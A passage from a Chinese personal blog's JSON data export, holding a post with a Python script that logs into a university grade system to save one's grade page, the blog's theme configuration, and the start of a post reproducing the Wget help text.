class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests,os</span><br><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"><span class=\"keyword\">from</span> bs4 <span class=\"keyword\">import</span> BeautifulSoup</span><br><span class=\"line\"></span><br><span class=\"line\">host = <span class=\"string\">&#x27;http://218.196.240.97&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;Accept&#x27;</span>: <span class=\"string\">&#x27;image/gif, image/jpeg, image/pjpeg,&#x27;</span></span><br><span class=\"line\">              <span class=\"string\">&#x27;application/x-ms-application, application/xaml+xml, application/x-ms-xbap, */*&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Accept-Encoding&#x27;</span>: <span class=\"string\">&#x27;gzip, deflate&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Accept-Language&#x27;</span>: <span class=\"string\">&#x27;zh-Hans-CN, zh-Hans;q=0.8, en-US;q=0.5,en;q=0.3&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Cache-Control&#x27;</span>: <span class=\"string\">&#x27;no-cache&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Connection&#x27;</span>: <span class=\"string\">&#x27;Keep-Alive&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Referer&#x27;</span>: <span class=\"string\">&#x27;http://218.196.240.97/loginAction.do&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0;&#x27;</span></span><br><span class=\"line\">                  <span class=\"string\">&#x27;.NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">form = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;zjh&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;mm&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;v_yzm&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">session = requests.session()</span><br><span class=\"line\">req = session.get(host + <span class=\"string\">&#x27;/validateCodeAction.do&#x27;</span>)</span><br><span class=\"line\">cookie = req.headers[<span class=\"string\">&#x27;Set-Cookie&#x27;</span>]</span><br><span class=\"line\">captcha = open(<span class=\"string\">&#x27;tmp.jpg&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>)</span><br><span class=\"line\">captcha.write(req.content)</span><br><span class=\"line\">captcha.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># form[&#x27;zjh&#x27;] = input()</span></span><br><span class=\"line\"><span class=\"comment\"># form[&#x27;mm&#x27;] = input()</span></span><br><span class=\"line\">form[<span class=\"string\">&#x27;zjh&#x27;</span>] = form[<span class=\"string\">&#x27;mm&#x27;</span>] = input()</span><br><span class=\"line\">form[<span class=\"string\">&#x27;v_yzm&#x27;</span>] = input()</span><br><span class=\"line\">os.remove(<span class=\"string\">&#x27;tmp.jpg&#x27;</span>)</span><br><span class=\"line\">req = session.post(host + <span class=\"string\">&#x27;/loginAction.do&#x27;</span>, data=form, headers=headers)</span><br><span class=\"line\"></span><br><span class=\"line\">req = session.get(host + <span class=\"string\">&#x27;/gradeLnAllAction.do?oper=qbinfo&#x27;</span>)</span><br><span class=\"line\">soup = BeautifulSoup(req.content,<span class=\"string\">&#x27;lxml&#x27;</span>)</span><br><span class=\"line\">soup = soup.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">soup = soup.replace(<span class=\"string\">&#x27;/css/newcss/&#x27;</span>,<span class=\"string\">&#x27;http://218.196.240.97/css/newcss/&#x27;</span>)</span><br><span class=\"line\">fb = open(<span class=\"string\">&#x27;index.html&#x27;</span>,<span class=\"string\">&#x27;wb&#x27;</span>)</span><br><span class=\"line\">fb.write(soup.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\">fb.close()</span><br></pre></td></tr></table></figure>","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":3657,"excerpt":"<h1 id=\"页面\"><a href=\"#页面\" class=\"headerlink\" title=\"页面\"></a>页面</h1><p><strong>学期成绩</strong>: <code>http://218.196.240.97/bxqcjcxAction.do</code><br><strong>历年成绩</strong>: <code>http://218.196.240.97/gradeLnAllAction.do?oper=qbinfo</code><br><strong>方案成绩</strong>: <code>http://218.196.240.97/gradeLnAllAction.do?oper=fainfo</code><br><strong>打印成绩</strong>: <code>http://218.196.240.27/reportFiles/student/cj_zwcjd_all.jsp</code><br>","more":"</p>\n<h1 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h1><blockquote>\n<p>构建header</p>\n</blockquote>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;Accept&#x27;</span>: <span class=\"string\">&#x27;image/gif, image/jpeg, image/pjpeg,&#x27;</span></span><br><span class=\"line\">              <span class=\"string\">&#x27;application/x-ms-application, application/xaml+xml, application/x-ms-xbap, */*&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Accept-Encoding&#x27;</span>: <span class=\"string\">&#x27;gzip, deflate&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Accept-Language&#x27;</span>: <span class=\"string\">&#x27;zh-Hans-CN, zh-Hans;q=0.8, en-US;q=0.5,en;q=0.3&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Cache-Control&#x27;</span>: <span class=\"string\">&#x27;no-cache&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Connection&#x27;</span>: <span class=\"string\">&#x27;Keep-Alive&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Referer&#x27;</span>: <span class=\"string\">&#x27;http://218.196.240.97/loginAction.do&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0;&#x27;</span></span><br><span class=\"line\">                  <span class=\"string\">&#x27;.NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)&#x27;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>构建表单</p>\n</blockquote>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">form = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;zjh&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;mm&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;v_yzm&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>获取验证码</p>\n</blockquote>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">session = requests.session()</span><br><span class=\"line\">req = session.get(host + <span class=\"string\">&#x27;/validateCodeAction.do&#x27;</span>)</span><br><span class=\"line\">cookie = req.headers[<span class=\"string\">&#x27;Set-Cookie&#x27;</span>]</span><br><span class=\"line\">captcha = open(<span class=\"string\">&#x27;tmp.jpg&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>)</span><br><span class=\"line\">captcha.write(req.content)</span><br><span class=\"line\">captcha.close()</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>登录</p>\n</blockquote>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">form[<span class=\"string\">&#x27;zjh&#x27;</span>] = form[<span class=\"string\">&#x27;mm&#x27;</span>] = input()</span><br><span class=\"line\">form[<span class=\"string\">&#x27;v_yzm&#x27;</span>] = input()</span><br><span class=\"line\">os.remove(<span class=\"string\">&#x27;tmp.jpg&#x27;</span>)</span><br><span class=\"line\">req = session.post(host + <span class=\"string\">&#x27;/loginAction.do&#x27;</span>, data=form, headers=headers)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>存为html</p>\n</blockquote>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">req = session.get(host + <span class=\"string\">&#x27;/gradeLnAllAction.do?oper=qbinfo&#x27;</span>)</span><br><span class=\"line\">soup = BeautifulSoup(req.content,<span class=\"string\">&#x27;lxml&#x27;</span>)</span><br><span class=\"line\">soup = soup.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">soup = soup.replace(<span class=\"string\">&#x27;/css/newcss/&#x27;</span>,<span class=\"string\">&#x27;http://218.196.240.97/css/newcss/&#x27;</span>)</span><br><span class=\"line\">fb = open(<span class=\"string\">&#x27;index.html&#x27;</span>,<span class=\"string\">&#x27;wb&#x27;</span>)</span><br><span class=\"line\">fb.write(soup.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\">fb.close()</span><br></pre></td></tr></table></figure>\n<h1 id=\"完整代码\"><a href=\"#完整代码\" class=\"headerlink\" title=\"完整代码\"></a>完整代码</h1><figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests,os</span><br><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"><span class=\"keyword\">from</span> bs4 <span class=\"keyword\">import</span> BeautifulSoup</span><br><span class=\"line\"></span><br><span class=\"line\">host = <span class=\"string\">&#x27;http://218.196.240.97&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;Accept&#x27;</span>: <span class=\"string\">&#x27;image/gif, image/jpeg, image/pjpeg,&#x27;</span></span><br><span class=\"line\">              <span class=\"string\">&#x27;application/x-ms-application, application/xaml+xml, application/x-ms-xbap, */*&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Accept-Encoding&#x27;</span>: <span class=\"string\">&#x27;gzip, deflate&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Accept-Language&#x27;</span>: <span class=\"string\">&#x27;zh-Hans-CN, zh-Hans;q=0.8, en-US;q=0.5,en;q=0.3&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Cache-Control&#x27;</span>: <span class=\"string\">&#x27;no-cache&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Connection&#x27;</span>: <span class=\"string\">&#x27;Keep-Alive&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Referer&#x27;</span>: <span class=\"string\">&#x27;http://218.196.240.97/loginAction.do&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0;&#x27;</span></span><br><span class=\"line\">                  <span class=\"string\">&#x27;.NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">form = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;zjh&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;mm&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;v_yzm&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">session = requests.session()</span><br><span class=\"line\">req = session.get(host + <span class=\"string\">&#x27;/validateCodeAction.do&#x27;</span>)</span><br><span class=\"line\">cookie = req.headers[<span class=\"string\">&#x27;Set-Cookie&#x27;</span>]</span><br><span class=\"line\">captcha = open(<span class=\"string\">&#x27;tmp.jpg&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>)</span><br><span class=\"line\">captcha.write(req.content)</span><br><span class=\"line\">captcha.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># form[&#x27;zjh&#x27;] = input()</span></span><br><span class=\"line\"><span class=\"comment\"># form[&#x27;mm&#x27;] = input()</span></span><br><span class=\"line\">form[<span class=\"string\">&#x27;zjh&#x27;</span>] = form[<span class=\"string\">&#x27;mm&#x27;</span>] = input()</span><br><span class=\"line\">form[<span class=\"string\">&#x27;v_yzm&#x27;</span>] = input()</span><br><span class=\"line\">os.remove(<span class=\"string\">&#x27;tmp.jpg&#x27;</span>)</span><br><span class=\"line\">req = session.post(host + <span class=\"string\">&#x27;/loginAction.do&#x27;</span>, data=form, headers=headers)</span><br><span class=\"line\"></span><br><span class=\"line\">req = session.get(host + <span class=\"string\">&#x27;/gradeLnAllAction.do?oper=qbinfo&#x27;</span>)</span><br><span class=\"line\">soup = BeautifulSoup(req.content,<span class=\"string\">&#x27;lxml&#x27;</span>)</span><br><span class=\"line\">soup = soup.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">soup = soup.replace(<span class=\"string\">&#x27;/css/newcss/&#x27;</span>,<span class=\"string\">&#x27;http://218.196.240.97/css/newcss/&#x27;</span>)</span><br><span class=\"line\">fb = open(<span class=\"string\">&#x27;index.html&#x27;</span>,<span class=\"string\">&#x27;wb&#x27;</span>)</span><br><span class=\"line\">fb.write(soup.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\">fb.close()</span><br></pre></td></tr></table></figure>"},{"title":"Wget命令解释","date":"2019-03-29T09:11:09.000Z","abbrlink":"2640927a","updated":"2020-05-11T09:42:24.799Z","_content":"# 使用帮助\n\nGNU Wget 1.11.4，非交互式的网络文件下载工具。\n用法： wget [选项]... [URL]...\nMandatory arguments to long options are mandatory for short options too.\n\n## Wget for Windows\n官网：http://gnuwin32.sourceforge.net/packages/wget.htm\n下载地址：http://downloads.sourceforge.net/gnuwin32/wget-1.11.4-1-setup.exe\n<!--more-->\n## Wget -- --help\n```cmake\nStartup:\n  -V,  --version           display the version of Wget and exit.\n  -h,  --help              print this help.\n  -b,  --background        go to background after startup.\n  -e,  --execute=COMMAND   execute a `.wgetrc'-style command.\n\nLogging and input file:\n  -o,  --output-file=FILE    log messages to FILE.\n  -a,  --append-output=FILE  append messages to FILE.\n  -d,  --debug               print lots of debugging information.\n  -q,  --quiet               quiet (no output).\n  -v,  --verbose             be verbose (this is the default).\n  -nv, --no-verbose          turn off verboseness, without being quiet.\n  -i,  --input-file=FILE     download URLs found in FILE.\n  -F,  --force-html          treat input file as HTML.\n  -B,  --base=URL            prepends URL to relative links in -F -i file.\n\nDownload:\n  -t,  --tries=NUMBER            set number of retries to NUMBER (0 unlimits).\n       --retry-connrefused       retry even if connection is refused.\n  -O,  --output-document=FILE    write documents to FILE.\n  -nc, --no-clobber              skip downloads that would download to\n                                 existing files.\n  -c,  --continue                resume getting a partially-downloaded file.\n       --progress=TYPE           select progress gauge type.\n  -N,  --timestamping            don't re-retrieve files unless newer than\n                                 local.\n  -S,  --server-response         print server response.\n       --spider                  don't download anything.\n  -T,  --timeout=SECONDS         set all timeout values to SECONDS.\n       --dns-timeout=SECS        set the DNS lookup timeout to SECS.\n       --connect-timeout=SECS    set the connect timeout to SECS.\n       --read-timeout=SECS       set the read timeout to SECS.\n  -w,  --wait=SECONDS            wait SECONDS between retrievals.\n       --waitretry=SECONDS       wait 1..SECONDS between retries of a retrieval.\n       --random-wait             wait from 0...2*WAIT secs between retrievals.\n       --no-proxy                explicitly turn off proxy.\n  -Q,  --quota=NUMBER            set retrieval quota to NUMBER.\n       --bind-address=ADDRESS    bind to ADDRESS (hostname or IP) on local host.\n       --limit-rate=RATE         limit download rate to RATE.\n       --no-dns-cache            disable caching DNS lookups.\n       --restrict-file-names=OS  restrict chars in file names to ones OS allows.\n       --ignore-case             ignore case when matching files/directories.\n  -4,  --inet4-only              connect only to IPv4 addresses.\n  -6,  --inet6-only              connect only to IPv6 addresses.\n       --prefer-family=FAMILY    connect first to addresses of specified family,\n                                 one of IPv6, IPv4, or none.\n       --user=USER               set both ftp and http user to USER.\n       --password=PASS           set both ftp and http password to PASS.\n\nDirectories:\n  -nd, --no-directories           don't create directories.\n  -x,  --force-directories        force creation of directories.\n  -nH, --no-host-directories      don't create host directories.\n       --protocol-directories     use protocol name in directories.\n  -P,  --directory-prefix=PREFIX  save files to PREFIX/...\n       --cut-dirs=NUMBER          ignore NUMBER remote directory components.\n\nHTTP options:\n       --http-user=USER        set http user to USER.\n       --http-password=PASS    set http password to PASS.\n       --no-cache              disallow server-cached data.\n  -E,  --html-extension        save HTML documents with `.html' extension.\n       --ignore-length         ignore `Content-Length' header field.\n       --header=STRING         insert STRING among the headers.\n       --max-redirect          maximum redirections allowed per page.\n       --proxy-user=USER       set USER as proxy username.\n       --proxy-password=PASS   set PASS as proxy password.\n       --referer=URL           include `Referer: URL' header in HTTP request.\n       --save-headers          save the HTTP headers to file.\n  -U,  --user-agent=AGENT      identify as AGENT instead of Wget/VERSION.\n       --no-http-keep-alive    disable 